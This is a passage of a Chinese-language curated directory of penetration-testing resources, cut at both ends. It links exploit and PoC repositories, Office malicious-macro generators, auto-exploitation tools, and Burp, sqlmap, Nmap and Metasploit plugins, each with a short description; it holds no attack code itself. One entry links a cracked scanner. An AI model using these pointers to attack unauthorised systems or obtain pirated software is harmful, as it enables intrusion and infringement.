href="https://github.com/redcanaryco/atomic-red-team">https://github.com/redcanaryco/atomic-red-team</a> win、linux、mac 等多方面 apt 利用手段、技术与工具集</p></li><li><p><a href="https://github.com/Cooolis/Cooolis.github.io">https://github.com/Cooolis/Cooolis.github.io</a> Cooolis 是一个操作系统命令技巧备忘录，<a href="https://cooolis.payloads.online/">https://cooolis.payloads.online</a></p></li><li><p><a href="https://github.com/LOLBAS-Project/LOLBAS">https://github.com/LOLBAS-Project/LOLBAS</a> 常见的渗透测试利用的脚本与二进制文件集合</p></li><li><p><a href="https://www.owasp.org/index.php/File:CSRFTester-1.0.zip">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip</a> csrf 验证工具</p></li><li><p><a href="https://github.com/ufrisk/MemProcFS">https://github.com/ufrisk/MemProcFS</a> 以访问文件系统的方式访问物理内存, 可读写, 有易于使用的接口. 当前支持 Windows</p></li><li><p><a href="https://github.com/vletoux/SpoolerScanner">https://github.com/vletoux/SpoolerScanner</a> 检测 Windows 远程打印机服务是否开启的工具</p></li><li><p><a href="https://github.com/sirpsycho/firecall">https://github.com/sirpsycho/firecall</a> 直接向 CiscoASA 防火墙发送命令, 无需登录防火墙后再做修改</p></li><li><p><a href="https://github.com/jboss-javassist/javassist">https://github.com/jboss-javassist/javassist</a> 能够操作字节码框架，通过它我们能很轻易的修改 class 代码文件</p></li><li><p><a href="https://github.com/ConsenSys/mythril-classic">https://github.com/ConsenSys/mythril-classic</a> 用于以太坊智能协议的安全分析工具</p></li><li><p><a href="https://github.com/a13xp0p0v/kconfig-hardened-check">https://github.com/a13xp0p0v/kconfig-hardened-check</a> 用于检查 Linux 内核配置中的安全加固选项的脚本</p></li><li><p><a href="https://github.com/lionsoul2014/ip2region">https://github.com/lionsoul2014/ip2region</a> ip 地址定位库，支持 python3 等多接口。类比 geoip</p></li><li><p><a href="https://github.com/m101/hsploit">https://github.com/m101/hsploit</a> 基于 rust 的 HEVD 漏洞利用程序</p></li><li><p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a> 针对 json web token 的检测</p></li><li><p><a href="https://github.com/clr2of8/DPAT">https://github.com/clr2of8/DPAT</a> 域密码配置审计</p></li><li><p><a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a> 域解析漏洞，跨域扫描器</p></li><li><p><a href="https://github.com/dienuet/crossdomain">https://github.com/dienuet/crossdomain</a> 域解析漏洞，跨域扫描器</p></li><li><p><a href="https://github.com/sfan5/fi6s">https://github.com/sfan5/fi6s</a> ipv6 端口快速扫描器</p></li><li><p><a href="https://github.com/lavalamp-/ipv666">https://github.com/lavalamp-/ipv666</a> go,ipv6 地址枚举扫描</p></li><li><p><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a> 命令注入漏洞扫描</p></li><li><p><a href="https://github.com/Graph-X/davscan">https://github.com/Graph-X/davscan</a> DAVScan 是一款快速轻便的 webdav 扫描仪，旨在发现 DAV 启用的 Web 服务器上的隐藏文件和文件夹</p></li><li><p><a href="https://github.com/jcesarstef/dotdotslash">https://github.com/jcesarstef/dotdotslash</a> 目录遍历漏洞测试</p></li><li><p><a href="https://github.com/P3GLEG/WhaleTail">https://github.com/P3GLEG/WhaleTail</a> 根据 docker 镜像生成成 dockerfile</p></li><li><p><a href="https://github.com/cr0hn/dockerscan">https://github.com/cr0hn/dockerscan</a> docker 扫描工具</p></li><li><p><a href="https://github.com/utiso/dorkbot">https://github.com/utiso/dorkbot</a> 通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描</p></li><li><p><a href="https://github.com/NullArray/DorkNet">https://github.com/NullArray/DorkNet</a> 基于搜索引擎的漏洞网页搜寻</p></li><li><p><a href="https://github.com/panda-re/lava">https://github.com/panda-re/lava</a> 大规模向程序中植入恶意程序</p></li><li><p><a href="https://github.com/woj-ciech/Danger-zone">https://github.com/woj-ciech/Danger-zone</a> 关联域名、IP 和电子邮件地址之间的数据并将其可视化输出</p></li><li><p><a href="https://github.com/securemode/DefenderKeys">https://github.com/securemode/DefenderKeys</a> 枚举出被 Windows Defender 排除扫描的配置</p></li><li><p><a href="https://github.com/D4Vinci/PasteJacker">https://github.com/D4Vinci/PasteJacker</a> 剪贴板劫持利用工具</p></li><li><p><a href="https://github.com/JusticeRage/freedomfighting">https://github.com/JusticeRage/freedomfighting</a> 日志清理、文件共享、反向 shell、简单爬虫工具包</p></li><li><p><a href="https://github.com/gh0stkey/PoCBox">https://github.com/gh0stkey/PoCBox</a> 漏洞测试验证辅助平台，SONP 劫持、CORS、Flash 跨域资源读取、Google Hack 语法生成、URL 测试字典生成、JavaScript URL 跳转、302 URL 跳转</p></li><li><p><a href="https://github.com/jakubroztocil/httpie">https://github.com/jakubroztocil/httpie</a> http 调试工具，类似 curl，功能更完善</p></li><li><p><a href="https://www.getpostman.com/">https://www.getpostman.com/</a> http 调试工具，带界面</p></li></ul><h2 id="漏洞收集与-Exp、Poc-利用"><a href="#漏洞收集与-Exp、Poc-利用" class="headerlink" title="漏洞收集与 Exp、Poc 利用#"></a><strong>漏洞收集与 Exp、Poc 利用</strong>#</h2><ul><li><p><a href="https://github.com/Lcys/Python_PoC">https://github.com/Lcys/Python_PoC</a> python3 的 poc、exp 快速编写模板，有众多模范版本</p></li><li><p><a href="https://github.com/raminfp/linux_exploit_development">https://github.com/raminfp/linux_exploit_development</a> linux 漏洞利用开发手册</p></li><li><p><a href="https://github.com/mudongliang/LinuxFlaw">https://github.com/mudongliang/LinuxFlaw</a> 包含 linux 下软件漏洞列表</p></li><li><p><a href="https://github.com/coffeehb/Some-PoC-oR-ExP">https://github.com/coffeehb/Some-PoC-oR-ExP</a> 各种漏洞 poc、Exp 的收集或编写</p></li><li><p><a href="https://github.com/userlandkernel/plataoplomo">https://github.com/userlandkernel/plataoplomo</a> Sem Voigtländer 公开其发现的 iOS 中各种漏洞，包括（Writeup/POC/Exploit）</p></li><li><p><a href="https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/check_icmp_dos.py">https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/check_icmp_dos.py</a> CVE-2018-4407，macos/ios 缓冲区溢出可导致系统崩溃</p></li><li><p><a href="https://github.com/vulnersCom/getsploit">https://github.com/vulnersCom/getsploit</a> py2,仿照 searchsploit 通过各种数据库的官方接口进行 payload 的查找</p></li><li><p><a href="https://github.com/SecWiki/CMS-Hunter">https://github.com/SecWiki/CMS-Hunter</a> CMS 漏洞测试用例集合</p></li><li><p><a href="https://github.com/Mr5m1th/0day">https://github.com/Mr5m1th/0day</a> 各种开源 CMS 各种版本的漏洞以及 EXP</p></li><li><p><a href="https://github.com/w1109790800/penetration">https://github.com/w1109790800/penetration</a> CMS 新老版本 exp 与系统漏洞搜集表</p></li><li><p><a href="https://github.com/blacknbunny/libSSH-Authentication-Bypass">https://github.com/blacknbunny/libSSH-Authentication-Bypass</a> CVE-2018-10933，libssh 服务端身份验证绕过</p></li><li><p><a href="https://github.com/leapsecurity/libssh-scanner">https://github.com/leapsecurity/libssh-scanner</a> CVE-2018-10933，libssh 服务端身份验证绕过</p></li><li><p><a href="https://github.com/anbai-inc/CVE-2018-4878">https://github.com/anbai-inc/CVE-2018-4878</a> Adobe Flash Exploit 生成 payload</p></li><li><p><a href="https://github.com/RetireJS/grunt-retire">https://github.com/RetireJS/grunt-retire</a> 扫描 js 扩展库的常见漏洞</p></li><li><p><a href="https://github.com/coffeehb/SSTIF">https://github.com/coffeehb/SSTIF</a> 服务器端模板注入漏洞的半自动化工具</p></li><li><p><a href="https://github.com/tijme/angularjs-csti-scanner">https://github.com/tijme/angularjs-csti-scanner</a> 探测客户端 AngularJS 模板注入漏洞工具</p></li><li><p><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a> Jenkins 漏洞探测、用户抓取爆破</p></li><li><p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> 服务器端模板注入漏洞检测与利用工具</p></li><li><p><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a> Java,IIS 短文件名暴力枚举漏洞利用工具</p></li><li><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a> py2,IIS 短文件名漏洞扫描</p></li><li><p><a href="https://github.com/rudSarkar/crlf-injector">https://github.com/rudSarkar/crlf-injector</a> CRLF 注入漏洞批量扫描</p></li><li><p><a href="https://github.com/hahwul/a2sv">https://github.com/hahwul/a2sv</a> SSL 漏洞扫描，例如心脏滴血漏洞等</p></li><li><p><a href="https://github.com/jagracey/Regex-DoS">https://github.com/jagracey/Regex-DoS</a> RegEx 拒绝服务扫描器</p></li><li><p><a href="https://github.com/Bo0oM/PHP_imap_open_exploit">https://github.com/Bo0oM/PHP_imap_open_exploit</a> 利用 imap_open 绕过 php exec 函数禁用</p></li><li><p><a href="https://www.anquanke.com/post/id/106488">https://www.anquanke.com/post/id/106488</a> 利用 mysql 服务端恶意配置读取客户端文件，（如何利用 MySQL LOCAL INFILE 读取客户端文件，Read MySQL Client’s File，【技术分享】从 MySQL 出发的反击之路）</p></li><li><p><a href="https://www.waitalone.cn/awvs-poc.html">https://www.waitalone.cn/awvs-poc.html</a> CVE-2015-4027，AWVS10 命令执行漏洞</p></li><li><p><a href="http://an7isec.blogspot.com/2014/04/pown-noobs-acunetix-0day.html">http://an7isec.blogspot.com/2014/04/pown-noobs-acunetix-0day.html</a> Pwn the n00bs - Acunetix 0day，awvs8 命令执行漏洞</p></li><li><p><a href="https://github.com/numpy/numpy/issues/12759">https://github.com/numpy/numpy/issues/12759</a> 科学计算框架 numpy 命令执行 RCE 漏洞</p></li><li><p><a href="https://github.com/petercunha/Jenkins-PreAuth-RCE-PoC">https://github.com/petercunha/Jenkins-PreAuth-RCE-PoC</a> jenkins 远程命令执行</p></li><li><p><a href="https://github.com/WyAtu/CVE-2018-20250">https://github.com/WyAtu/CVE-2018-20250</a> WinRar 执行漏洞加使用介绍</p></li></ul><h2 id="物联网路由工控漏洞收集"><a href="#物联网路由工控漏洞收集" class="headerlink" title="物联网路由工控漏洞收集#"></a><strong>物联网路由工控漏洞收集</strong>#</h2><ul><li><p><a href="https://github.com/yassineaboukir/CVE-2018-0296">https://github.com/yassineaboukir/CVE-2018-0296</a> 测试思科 ASA 路径穿越漏洞，可获取系统详细信息</p></li><li><p><a href="https://github.com/seclab-ucr/tcp_exploit">https://github.com/seclab-ucr/tcp_exploit</a> 利用 tcp 漏洞使无线路由器产生隐私泄露</p></li><li><p><a href="https://github.com/ezelf/CVE-2018-9995_dvr_credentials">https://github.com/ezelf/CVE-2018-9995_dvr_credentials</a> CVE-2018-9995 摄像头路由，Get DVR Credentials</p></li></ul><h2 id="Java-反序列化漏洞收集"><a href="#Java-反序列化漏洞收集" class="headerlink" title="Java 反序列化漏洞收集#"></a><strong>Java 反序列化漏洞收集</strong>#</h2><ul><li><p><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a> java 反序列化利用</p></li><li><p><a href="https://github.com/GoSecure/break-fast-serial">https://github.com/GoSecure/break-fast-serial</a> 借助 DNS 解析来检测 Java 反序列化漏洞工具</p></li><li><p><a href="https://github.com/s1kr10s/Apache-Struts-v3">https://github.com/s1kr10s/Apache-Struts-v3</a> Apache-Struts 漏洞利用工具</p></li><li><p><a href="https://github.com/iBearcat/S2-057">https://github.com/iBearcat/S2-057</a> struts2 CVE-2018-11776 漏洞检测工具</p></li><li><p><a href="https://github.com/Ivan1ee/struts2-057-exp">https://github.com/Ivan1ee/struts2-057-exp</a> struts2-057 利用脚本</p></li><li><p><a href="https://github.com/theLSA/s2sniper">https://github.com/theLSA/s2sniper</a> struts2 漏洞的检测工具</p></li><li><p><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a> 批量检测 struts 命令执行漏洞</p></li><li><p><a href="https://github.com/lijiejie/struts2_045_scan">https://github.com/lijiejie/struts2_045_scan</a> Struts2-045 漏洞批量扫描工具</p></li><li><p><a href="https://github.com/riusksk/StrutScan">https://github.com/riusksk/StrutScan</a> 基于 perl 的 strut2 的历史漏洞扫描</p></li><li><p><a href="https://github.com/Coalfire-Research/java-deserialization-exploits">https://github.com/Coalfire-Research/java-deserialization-exploits</a> java 反序列化漏洞收集</p></li><li><p><a href="https://github.com/quentinhardy/jndiat">https://github.com/quentinhardy/jndiat</a> weblogic 漏洞利用工具</p></li><li><p><a href="https://github.com/jas502n/CVE-2018-3191">https://github.com/jas502n/CVE-2018-3191</a> Weblogic CVE-2018-3191 远程代码命令执行</p></li><li><p><a href="https://github.com/pyn3rd/CVE-2018-3245">https://github.com/pyn3rd/CVE-2018-3245</a> weblogic cve-2018-2893 与 cve-2018-3245 远程代码命令执行</p></li><li><p><a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a> 用于 Java Remote Method Invocation 服务的工具/rmi 的枚举与远程命令执行</p></li><li><p><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a> JBoss 和其他 java 序列化漏洞验证和开发工具</p></li><li><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> java 反序列化利用工具</p></li></ul><h2 id="版本管理平台漏洞收集"><a href="#版本管理平台漏洞收集" class="headerlink" title="版本管理平台漏洞收集#"></a><strong>版本管理平台漏洞收集</strong>#</h2><ul><li><p><a href="https://github.com/shengqi158/svnhack">https://github.com/shengqi158/svnhack</a> .svn 文件夹泄漏利用工具</p></li><li><p><a href="https://www.waitalone.cn/seay-svn-poc-donw-20140505.html">https://www.waitalone.cn/seay-svn-poc-donw-20140505.html</a> Seay-Svn 源代码泄露漏洞利用工具，2014-05-05 版</p></li><li><p><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> .git 文件利用工具，lijiejie 改进版</p></li><li><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a> .git 文件利用工具</p></li></ul><h2 id="MS-与-Office-漏洞收集"><a href="#MS-与-Office-漏洞收集" class="headerlink" title="MS 与 Office 漏洞收集#"></a><strong>MS 与 Office 漏洞收集</strong>#</h2><ul><li><p><a href="https://github.com/Lz1y/CVE-2017-8759">https://github.com/Lz1y/CVE-2017-8759</a> .NET Framework 换行符漏洞，CVE-2017-8759 完美复现（另附加 hta+powershell 弹框闪烁解决方案）<a href="https://www.freebuf.com/vuls/147793.html">https://www.freebuf.com/vuls/147793.html</a></p></li><li><p><a href="https://github.com/WyAtu/CVE-2018-8581">https://github.com/WyAtu/CVE-2018-8581</a> Exchange 使用完成添加收信规则的操作进行横向渗透和提权漏洞</p></li><li><p><a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a> PS,用于在 Microsoft Exchange 环境搜索电子邮件查找特定邮件（密码、网络架构信息等）</p></li><li><p><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a> GO,通过 MAPI / HTTP 或 RPC / HTTP 协议远程与 Exchange 服务器进行交互,通过客户端 Outlook 功能远程获取 shell</p></li><li><p><a href="https://github.com/3gstudent/Smbtouch-Scanner">https://github.com/3gstudent/Smbtouch-Scanner</a> 扫描内网永恒之蓝 ETERNAL445SMB 系列漏洞</p></li><li><p><a href="https://github.com/smgorelik/Windows-RCE-exploits">https://github.com/smgorelik/Windows-RCE-exploits</a> windows 命令执行 RCE 漏洞 POC 样本，分为 web 与文件两种形式</p></li><li><p><a href="https://github.com/3gstudent/CVE-2017-8464-EXP">https://github.com/3gstudent/CVE-2017-8464-EXP</a> CVE-2017-8464，win 快捷方式远程执行漏洞</p></li><li><p><a href="https://github.com/Lz1y/CVE-2018-8420">https://github.com/Lz1y/CVE-2018-8420</a> Windows 的 msxml 解析器漏洞可以通过 ie 或 vbs 执行后门</p></li><li><p><a href="https://www.anquanke.com/post/id/163000">https://www.anquanke.com/post/id/163000</a> 利用 Excel 4.0 宏躲避杀软检测的攻击技术分析</p></li><li><p><a href="https://github.com/BuffaloWill/oxml_xxe">https://github.com/BuffaloWill/oxml_xxe</a> XXE 漏洞利用</p></li><li><p><a href="https://thief.one/2017/06/20/1/">https://thief.one/2017/06/20/1/</a> 浅谈 XXE 漏洞攻击与防御</p></li><li><p><a href="https://github.com/thom-s/docx-embeddedhtml-injection">https://github.com/thom-s/docx-embeddedhtml-injection</a> word2016，滥用 Word 联机视频特征执行恶意代码 poc</p></li><li><p><a href="https://blog.cymulate.com/abusing-microsoft-office-online-video">https://blog.cymulate.com/abusing-microsoft-office-online-video</a> word2016，滥用 Word 联机视频特征执行恶意代码介绍</p></li><li><p><a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a> 无需开启宏即可在 word 文档中利用 DDE 执行命令</p></li><li><p><a href="http://www.freebuf.com/articles/terminal/150285.html">http://www.freebuf.com/articles/terminal/150285.html</a> 无需开启宏即可在 word 文档中利用 DDE 执行命令利用</p></li><li><p><a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a> 利用 word 文档 RTF 获取 shell，<a href="https://evi1cg.me/archives/CVE_2017_11882_exp.html">https://evi1cg.me/archives/CVE_2017_11882_exp.html</a></p></li><li><p><a href="https://github.com/Lz1y/CVE-2017-8759">https://github.com/Lz1y/CVE-2017-8759</a> 利用 word 文档 hta 获取 shell，<a href="http://www.freebuf.com/vuls/147793.html">http://www.freebuf.com/vuls/147793.html</a></p></li><li><p><a href="https://fuping.site/2017/04/18/CVE-2017-0199">https://fuping.site/2017/04/18/CVE-2017-0199</a> 漏洞复现过程 WORD RTF 文档，配合 msf 利用</p></li><li><p><a href="https://github.com/tezukanice/Office8570">https://github.com/tezukanice/Office8570</a> 利用 ppsx 幻灯片远程命令执行，<a href="https://github.com/rxwx/CVE-2017-8570">https://github.com/rxwx/CVE-2017-8570</a></p></li><li><p><a href="https://github.com/0x09AL/CVE-2018-8174-msf">https://github.com/0x09AL/CVE-2018-8174-msf</a> 目前支持的版本是 32 位 IE 浏览器和 32 位 office。网页访问上线，浏览器关闭，shell 依然存活，<a href="http://www.freebuf.com/vuls/173727.html">http://www.freebuf.com/vuls/173727.html</a></p></li><li><p><a href="http://www.4hou.com/technology/9405.html">http://www.4hou.com/technology/9405.html</a> 在 Office 文档的属性中隐藏攻击载荷</p></li><li><p><a href="https://evi1cg.me/archives/Create_PPSX.html">https://evi1cg.me/archives/Create_PPSX.html</a> 构造 PPSX 钓鱼文件</p></li><li><p><a href="https://github.com/enigma0x3/Generate-Macro">https://github.com/enigma0x3/Generate-Macro</a> PowerShell 脚本，生成含有恶意宏的 Microsoft Office 文档</p></li><li><p><a href="https://github.com/mwrlabs/wePWNise">https://github.com/mwrlabs/wePWNise</a> 生成独立于体系结构的 VBA 代码，用于 Office 文档或模板，并自动绕过应用程序控制</p></li><li><p><a href="https://github.com/curi0usJack/luckystrike">https://github.com/curi0usJack/luckystrike</a> 基于 ps，用于创建恶意的 Office 宏文档</p></li><li><p><a href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a> MS Office 文档、VBS 格式、快捷方式 payload 捆绑</p></li><li><p><a href="https://github.com/khr0x40sh/MacroShop">https://github.com/khr0x40sh/MacroShop</a> 一组通过 Office 宏传递有效载荷的脚本</p></li></ul><h2 id="相关工具拓展插件"><a href="#相关工具拓展插件" class="headerlink" title="相关工具拓展插件#"></a><strong>相关工具拓展插件</strong>#</h2><ul><li><a href="https://github.com/AntSword-Store/">https://github.com/AntSword-Store/</a> 中国蚁剑插件市场</li></ul><h2 id="Kali-环境下拓展插件"><a href="#Kali-环境下拓展插件" class="headerlink" title="Kali 环境下拓展插件#"></a><strong>Kali 环境下拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/secforce/sparta">https://github.com/secforce/sparta</a> py，图形化应用程序联动 Nmap、Nikto、Hydra 等工具</p></li><li><p><a href="https://github.com/Manisso/fsociety">https://github.com/Manisso/fsociety</a> linux 下类似于 kali 的工具包一键安装工具</p></li><li><p><a href="https://github.com/LionSec/katoolin">https://github.com/LionSec/katoolin</a> 使用 linux 服务器自动安装 kali 工具包</p></li><li><p><a href="https://github.com/skavngr/rapidscan">https://github.com/skavngr/rapidscan</a> py2，simple，联动 kali 下工具，漏洞扫描工具</p></li><li><p><a href="https://github.com/koenbuyens/kalirouter">https://github.com/koenbuyens/kalirouter</a> 将 kali 设置为一个路由流量分析系统</p></li></ul><h2 id="Nessus-相关工具拓展插件"><a href="#Nessus-相关工具拓展插件" class="headerlink" title="Nessus 相关工具拓展插件#"></a><strong>Nessus 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://www.tenable.com/downloads/nessus">https://www.tenable.com/downloads/nessus</a></p></li><li><p><a href="https://github.com/se55i0n/Awvs_Nessus_Scanner_API">https://github.com/se55i0n/Awvs_Nessus_Scanner_API</a> 扫描器 Awvs 11 和 Nessus 7 Api 利用脚本</p></li><li><p><a href="https://github.com/DanMcInerney/msf-autoshell">https://github.com/DanMcInerney/msf-autoshell</a> 配合 nessus 扫描结果进行 msf 攻击</p></li><li><p><a href="https://github.com/MooseDojo/apt2">https://github.com/MooseDojo/apt2</a> 联动 nmap、nessus 等工具进行安全测试</p></li></ul><h2 id="Awvs-相关工具拓展插件"><a href="#Awvs-相关工具拓展插件" class="headerlink" title="Awvs 相关工具拓展插件#"></a><strong>Awvs 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://www.52pojie.cn/thread-214819-1-1.html">https://www.52pojie.cn/thread-214819-1-1.html</a> awvs10.5 开发框架破解版</p></li><li><p><a href="https://github.com/fnmsd/awvs_script_decode">https://github.com/fnmsd/awvs_script_decode</a> awvs10.5 规则 scripts 解密版，SDK，开发手册</p></li><li><p><a href="https://github.com/NS-Sp4ce/AWVS11.X-Chinese-Version">https://github.com/NS-Sp4ce/AWVS11.X-Chinese-Version</a> awvs11 汉化包</p></li></ul><h2 id="Burpsuit-相关工具拓展插件"><a href="#Burpsuit-相关工具拓展插件" class="headerlink" title="Burpsuit 相关工具拓展插件#"></a><strong>Burpsuit 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/PortSwigger">https://github.com/PortSwigger</a> burpsuite 官方插件库</p></li><li><p><a href="https://github.com/snoopysecurity/awesome-burp-extensions">https://github.com/snoopysecurity/awesome-burp-extensions</a> awesome 系列之 burp 拓展</p></li><li><p><a href="https://github.com/d3vilbug/HackBar">https://github.com/d3vilbug/HackBar</a> 集成 hackbar</p></li><li><p><a href="https://github.com/PortSwigger/turbo-intruder">https://github.com/PortSwigger/turbo-intruder</a> 比 Burp 自带的 Intruder 更快，一分钟打 1.61 万次请求</p></li><li><p><a href="https://github.com/Ebryx/AES-Killer">https://github.com/Ebryx/AES-Killer</a> burp 插件，破解 aes 加密的插件</p></li><li><p><a href="https://github.com/bugcrowd/HUNT">https://github.com/bugcrowd/HUNT</a> 可以将 burpsuite 扫描器功能扩展的更加强大，同时支持 zapproxy 扩展</p></li><li><p><a href="https://github.com/wagiro/BurpBounty">https://github.com/wagiro/BurpBounty</a> burp 插件增强主动与被动扫描功能</p></li><li><p><a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler">https://github.com/nccgroup/BurpSuiteHTTPSmuggler</a> Burp 拓展, 使用几种技巧绕过 WAF</p></li><li><p><a href="https://github.com/PortSwigger/command-injection-attacker">https://github.com/PortSwigger/command-injection-attacker</a> burp 插件，命令注入漏洞检测</p></li><li><p><a href="https://github.com/nccgroup/freddy">https://github.com/nccgroup/freddy</a> burp 插件，自动识别 Java/.NET 应用程序中的反序列化漏洞</p></li><li><p><a href="https://github.com/modzero/interestingFileScanner">https://github.com/modzero/interestingFileScanner</a> burp 插件，增强敏感文件扫描</p></li><li><p><a href="https://github.com/summitt/Burp-Non-HTTP-Extension">https://github.com/summitt/Burp-Non-HTTP-Extension</a> burp 插件，布置 dns 服务器抓取流量</p></li><li><p><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a> burp 拓展，扫描 J2EE 应用</p></li><li><p><a href="https://github.com/JGillam/burp-co2">https://github.com/JGillam/burp-co2</a> 集成了 sqlmap，菜刀，字典生成等</p></li><li><p><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a> burp 插件，检测 ssrf 漏洞</p></li></ul><h2 id="Sqlmap-相关工具拓展插件"><a href="#Sqlmap-相关工具拓展插件" class="headerlink" title="Sqlmap 相关工具拓展插件#"></a><strong>Sqlmap 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/codewatchorg/sqlipy">https://github.com/codewatchorg/sqlipy</a> burp 与 sqlmap 联动插件</p></li><li><p><a href="https://github.com/Hood3dRob1n/SQLMAP-Web-GUI">https://github.com/Hood3dRob1n/SQLMAP-Web-GUI</a> sqlmap 的 web gui</p></li><li><p><a href="https://github.com/KINGSABRI/sqlmap-tamper-api">https://github.com/KINGSABRI/sqlmap-tamper-api</a> 利用各种语言来编写 sqlmapTamper</p></li><li><p><a href="https://github.com/0xbug/SQLiScanner">https://github.com/0xbug/SQLiScanner</a> 一款基于 sqlmapapi 和 Charles 的被动 SQL 注入漏洞扫描工具</p></li><li><p><a href="https://github.com/fengxuangit/Fox-scan">https://github.com/fengxuangit/Fox-scan</a> 基于 sqlmapapi 的主动和被动资源发现的漏洞扫描工具</p></li><li><p><a href="https://github.com/UltimateHackers/sqlmate">https://github.com/UltimateHackers/sqlmate</a> 在 sqlmap 基础上增加了目录扫描、hash 爆破等功能</p></li><li><p><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a> ysrc 出品的被动式漏洞扫描工具，基于 sqlmapapi</p></li><li><p><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a> 基于 sqlmapapi，ruby 编写的漏洞代理型检测工具</p></li><li><p><a href="https://github.com/jesuiscamille/AutoSQLi">https://github.com/jesuiscamille/AutoSQLi</a> 利用 DorkNet，Googler, Ddgr, WhatWaf 和 sqlmap 自动注入</p></li></ul><h2 id="Nmap-相关工具拓展插件"><a href="#Nmap-相关工具拓展插件" class="headerlink" title="Nmap 相关工具拓展插件#"></a><strong>Nmap 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/Ullaakut/nmap">https://github.com/Ullaakut/nmap</a> GO，实现的 Nmap 调用库</p></li><li><p><a href="https://github.com/cldrn/nmap-nse-scripts">https://github.com/cldrn/nmap-nse-scripts</a> NSE 收集列表</p></li><li><p><a href="https://github.com/vulnersCom/nmap-vulners">https://github.com/vulnersCom/nmap-vulners</a> 使用 nmap 扫描常见的服务漏洞</p></li><li><p><a href="https://github.com/s4n7h0/Halcyon">https://github.com/s4n7h0/Halcyon</a> Nmap Script (NSE)IDE 编辑器</p></li><li><p><a href="https://github.com/m4ll0k/AutoNSE">https://github.com/m4ll0k/AutoNSE</a> NSE 自动化利用</p></li><li><p><a href="https://github.com/Screetsec/Dracnmap">https://github.com/Screetsec/Dracnmap</a> shell，将 Nmap 复杂的命令进行一定程度的集成与简化，使新用户更加容易上手。</p></li><li><p><a href="https://github.com/cldrn/rainmap-lite">https://github.com/cldrn/rainmap-lite</a> Django，Web 版 Nmap，可以建立新的扫描服务器，允许用户从他们的手机/平板电脑/网络浏览器启动 Nmap 扫描</p></li><li><p><a href="https://github.com/trimstray/sandmap">https://github.com/trimstray/sandmap</a> linux 下将支持使用大量 Nmap 引擎进行网络和系统侦察的工具</p></li><li><p><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a> 基于 nmap 的扫描器，与 cve 漏洞关联</p></li><li><p><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a> 基于 nmap 的高级漏洞扫描器，命令行环境使用</p></li><li><p><a href="https://github.com/Rev3rseSecurity/WebMap">https://github.com/Rev3rseSecurity/WebMap</a> 将 nmap 的 xml web 展示器</p></li><li><p><a href="https://github.com/DanMcInerney/msf-autopwn">https://github.com/DanMcInerney/msf-autopwn</a> 执行 NMap 扫描或读取扫描结果, 然后自动使用 msf 攻击包含常见漏洞的主机</p></li></ul><h2 id="Metasploit-相关工具拓展插件"><a href="#Metasploit-相关工具拓展插件" class="headerlink" title="Metasploit 相关工具拓展插件#"></a><strong>Metasploit 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a> 结合机器学习与 msf 的全自动测试工具</p></li><li><p><a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a> 一个可以创建 SSL/TLS shell 连接的脚本</p></li><li><p><a href="https://github.com/DanMcInerney/msf-netpwn">https://github.com/DanMcInerney/msf-netpwn</a> 等待 msf 的 session，并自动提为域管理</p></li><li><p><a href="https://www.exploit-db.com/exploits/45851/">https://www.exploit-db.com/exploits/45851/</a> msf 插件，利用 jira upm 上传进行命令执行</p></li><li><p><a href="https://github.com/NullArray/AutoSploit">https://github.com/NullArray/AutoSploit</a> 利用 Shodan 搜索引擎收集目标, 并自动调用设定的 msf 模块对目标发动攻击</p></li><li><p><a href="https://github.com/WazeHell/metateta">https://github.com/WazeHell/metateta</a> 使用 msf 脚本，根据特定协议进行扫描</p></li><li><p><a href="https://github.com/fbkcs/msf-elf-in-memory-execution">https://github.com/fbkcs/msf-elf-in-memory-execution</a> Metasploit 模块, 用于在内存中执行 ELF 文件</p></li><li><p><a 